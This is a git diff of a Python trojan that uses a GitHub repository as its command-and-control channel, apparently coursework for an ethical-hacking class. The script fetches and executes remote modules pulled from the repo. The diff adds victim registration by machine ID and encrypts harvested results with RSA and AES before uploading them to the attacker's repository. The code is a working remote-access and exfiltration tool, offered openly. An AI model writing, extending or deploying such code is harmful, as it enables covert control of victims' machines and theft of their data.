@@ -6,16 +6,29 @@ import random
 import sys
 import threading
 import time
+import uuid
+
+import string
+import hashlib
+from Crypto import Random
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP, AES
+
+import string
+import hashlib
+from Crypto import Random
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP, AES
 
 from datetime import datetime
 
 
 def github_connect():
     with open('mytoken.txt') as f:
-        token = f.read()
-    user = 'gebruikersnaam'
+        token = f.read().strip()
+    user = 'WatcherWhale'
     sess = github3.login(token=token)
-    return sess.repository(user, 'reponaam')
+    return sess.repository(user, 'EH_Week8')
 
 
 def get_file_contents(dirname, module_name, repo):
@@ -27,13 +40,16 @@ class GitImporter:
         self.current_module_code = ""
 
     def find_module(self, name, path=None):
-        print("[*] Attempting to retrieve %s" % name)
-        self.repo = github_connect()
+        try:
+            print("[*] Attempting to retrieve %s" % name)
+            self.repo = github_connect()
 
-        new_library = get_file_contents('modules', f'{name}.py', self.repo)
-        if new_library is not None:
-            self.current_module_code = base64.b64decode(new_library)
-            return self
+            new_library = get_file_contents('modules', f'{name}.py', self.repo)
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+        except:
+            print("[x] Failed to import " + name)
 
     def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None,
@@ -51,6 +67,14 @@ class Trojan:
         self.data_path = f'data/{id}/'
         self.repo = github_connect()
 
+    def is_registered(self, comp_id):
+        return len(list(filter(lambda x: x[0] == comp_id, self.repo.directory_contents("data/registered")))) > 0
+
+    def register(self):
+        comp_id = hex(uuid.getnode())
+        if not self.is_registered(comp_id):
+            self.repo.create_file("data/registered/" + comp_id, comp_id, comp_id.encode())
+
     def get_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
@@ -67,10 +91,44 @@ class Trojan:
     def store_module_result(self, data):
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
-        bindata = bytes('%r' % data, 'utf-8')
-        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+
+        password = self.get_password()
+        enc_pass = self.encrypt_rsa(password)
+
+        bindata = self.encrypt(data, password)
+
+        out_data = base64.b64encode(enc_pass).decode() + "." + bindata
+
+        self.repo.create_file(remote_path, message, out_data.encode())
+
+    def get_key(self):
+        key = get_file_contents('keys', 'pub.key', self.repo)
+        return base64.b64decode(key)
+
+    def get_password(self):
+        return ''.join(random.choice(string.ascii_letters) for i in range(32)).encode()
+
+    def encrypt(self, data, password):
+        private_key = hashlib.sha256(password).digest()
+
+        BLOCK_SIZE = 16
+        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
+
+        raw = pad(base64.b64encode(data).decode()).encode()
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(private_key, AES.MODE_CBC, iv)
+
+        return base64.b64encode(iv + cipher.encrypt(raw)).decode()
+
+    def encrypt_rsa(self, data):
+        public_key = self.get_key()
+        public_key = RSA.importKey(public_key)
+        public_key = PKCS1_OAEP.new(public_key)
+
+        return public_key.encrypt(data)
 
     def run(self):
+        self.register()
         while True:
             config = self.get_config()
             for task in config:
